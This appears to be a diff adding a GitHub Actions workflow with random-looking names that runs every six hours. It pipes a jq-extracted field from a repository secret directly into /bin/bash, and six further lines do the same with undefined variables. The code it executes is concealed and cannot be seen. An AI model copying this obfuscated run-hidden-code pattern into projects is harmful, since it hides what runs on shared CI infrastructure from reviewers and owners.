@@ -1,0 +1,23 @@
+name: shoushijiushann
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shoushijiushann
+        env:
+          qbxu81491: ${{ secrets.qbxu81491 }}
+        run: |
+          echo $qbxu81491 | jq -r .ayv73614 | /bin/bash
+          echo $ndkc5 | jq -r .clap49372 | /bin/bash
+          echo $puh16 | jq -r .nrtk52 | /bin/bash
+          echo $ttvl277 | jq -r .hkx9 | /bin/bash
+          echo $xl0 | jq -r .udwb4216 | /bin/bash
+          echo $efskn08 | jq -r .v8829 | /bin/bash
+          echo $q479 | jq -r .sufs2 | /bin/bash
+
